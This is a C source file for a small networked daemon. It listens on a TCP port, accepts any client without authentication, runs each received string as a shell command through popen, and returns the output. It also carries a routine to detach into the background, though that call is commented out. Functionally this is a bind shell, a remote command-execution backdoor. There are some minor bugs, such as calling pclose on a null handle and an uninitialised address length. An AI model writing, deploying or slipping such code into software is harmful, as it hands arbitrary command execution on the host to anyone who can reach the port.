#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <syslog.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>

#include "util.h"

static int daemonize(char *cmd)
{
    pid_t pid;

    umask(0);
    pid = fork();
    if (pid < 0) {
        return -1;
    } else if (pid > 0) {
        exit(0);
    }

    /* become session leader */
    setsid();
    pid = fork();
    if (pid > 0) {
        exit(0);
    } else if (pid < 0) {
        return -1;
    }

    if (chdir("/") < 0) {
        return -1;
    }

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    openlog(cmd, LOG_CONS, LOG_DAEMON);

    return 0;
}

static int init_tcp_server(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return -1;
    }

    struct sockaddr_in server_addr = {
        .sin_family = AF_INET,
        .sin_port = PORT,
        .sin_addr.s_addr = inet_addr(ADDR),
    };

    if (bind(fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        return -1;
    }

    if (listen(fd, 10) < 0) {
        return -1;
    }

    return fd;
}

static void *exec_cmd_func(void *arg)
{
    int ret = 0;
    FILE *fp = NULL;
    int rd_size = 0;
    int fd = (int)(long)arg;
    char cmd[MAX_CMD_LEN] = {0};
    char buf[MAX_BUF_LEN] = {0};

    while (recv(fd, cmd, MAX_CMD_LEN, 0) > 0) {
        if (!strcmp(cmd, "exit")) {
            pthread_exit(0);
        }
        fp = popen(cmd, "r");
        if (fp == NULL) {
            pclose(fp);
            continue;
        }
        rd_size = read(fileno(fp), buf, MAX_BUF_LEN);
        if (rd_size > 0) {
            do {
                ret = send(fd, buf, rd_size, 0);
                if (ret < 0) {
                    syslog(LOG_ERR, "send to client error\n");
                }
            } while ((rd_size = read(fileno(fp), buf, MAX_BUF_LEN)) > 0);
        } else {
            memset(buf, 0, MAX_BUF_LEN);
            ret = send(fd, buf, 0, 0); 
            if (ret < 0) {
                syslog(LOG_ERR, "send to client error\n");
            }   
        }
        pclose(fp);

        memset(cmd, 0, MAX_CMD_LEN);
        memset(buf, 0, MAX_BUF_LEN);
    }

    return NULL;
}

static int start_handle_client(int fd)
{
    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    if (pthread_create(&tid, &attr, exec_cmd_func, (void *)(long)fd) < 0) {
        return -1;
    }
    pthread_attr_destroy(&attr);

    return 0;
}

static int start_tcp_server(int sockfd)
{
    int fd = -1;
    int ret = 0;
    struct sockaddr_in client_addr;
    int client_addr_len = 0;

    memset(&client_addr, 0, sizeof(client_addr));
    while (1) {
        fd = accept(sockfd, (struct sockaddr *)&client_addr, &client_addr_len);
        if (fd < 0) {
            syslog(LOG_ERR, "accept client error\n");
        }
        ret = start_handle_client(fd);
        if (ret < 0) {
            syslog(LOG_ERR, "handle client request error\n");
        }
    }

    return 0;
}

int main(void)
{
    int ret = 0;
    int fd = -1;

//    ret = daemonize(CMD);
    if (ret < 0) {
        return -1;
    }

    fd = init_tcp_server();
    if (fd < 0) {
        return -1;
    }

    start_tcp_server(fd);

    return 0;
}
